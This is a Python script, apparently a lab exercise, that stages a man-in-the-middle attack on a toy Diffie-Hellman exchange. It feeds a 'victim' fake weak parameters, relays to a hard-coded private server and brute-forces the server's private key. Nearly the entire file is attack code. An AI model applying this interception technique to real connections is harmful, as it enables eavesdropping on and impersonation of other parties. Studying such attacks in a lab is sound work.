import random
import socket

MITM_IP = input("Enter your MITM's IP address: ")
SERVER_IP = '10.208.66.147'
SERVER_PORT = 5555


def main():
    try:
        victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        victim_socket.bind((MITM_IP, 5555))
        victim_socket.listen(1)

        print(f"[WAITING] MITM is listening on {MITM_IP}:5555")

        victim_connection, victim_address = victim_socket.accept()
        print(f"[SUCCESS] Victim connected from {victim_address}")

        server_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_connection.connect((SERVER_IP, SERVER_PORT))
        print(f"[SUCCESS] Connected to the server at {
              SERVER_IP}:{SERVER_PORT}")

        print("\n")
        print("Talking to the victim...")
        print("\n")

        victim_entry_no = victim_connection.recv(1024).decode()
        print(f"[RECEIVED] Data from the victim: {victim_entry_no}")

        fake_P, fake_G = 1234567, 3
        fake_dh_parameters = f"{fake_P},{fake_G}"
        victim_connection.sendall(fake_dh_parameters.encode())
        print(f"[SENT] FAKE DH parameters to the victim: {fake_dh_parameters}")

        victim_public_key = victim_connection.recv(1024).decode()
        print(f"[RECEIVED] Victim Public Key: {victim_public_key}")

        fake_mitm_private_key = 127
        print("[GENERATE] Fake MITM Private Key:", fake_mitm_private_key)

        fake_mitm_public_key = pow(fake_G, fake_mitm_private_key, fake_P)
        victim_connection.sendall(str(fake_mitm_public_key).encode())
        print(f"[SENT] Fake Public Key: {fake_mitm_public_key}")

        print("\n")
        print("Talking to the server...")
        print("\n")

        server_connection.sendall(victim_entry_no.encode())
        print("[SENT] Victims data")

        dh_parameters = server_connection.recv(1024).decode().split(',')
        correct_P = int(dh_parameters[0])
        correct_G = int(dh_parameters[1])
        print(f"[RECEIVED] Correct DH parameters: {correct_P},{correct_G}")

        correct_private_key = random.getrandbits(32)
        print(f"[GENERATE] Private Key: {correct_private_key}")

        correct_public_key = pow(correct_G, correct_private_key, correct_P)
        server_connection.sendall(str(correct_public_key).encode())
        print(f"[SENT] Public Key: {correct_public_key}")

        correct_shared_secret = pow(int(server_connection.recv(
            1024).decode()), correct_private_key, correct_P)
        print(f"[RECEIVED] Shared Secret: {correct_shared_secret}")

        correct_private_key_server = 1
        while (True):
            if correct_shared_secret == pow(correct_G, correct_private_key * correct_private_key_server, correct_P):
                print(f"[CRACKED] Private Key of Server: {
                      correct_private_key_server}")
                break
            correct_private_key_server += 1

    except Exception as e:
        print(f"[ERROR] {e}")
    finally:
        victim_connection.close()
        server_connection.close()


if __name__ == "__main__":
    main()
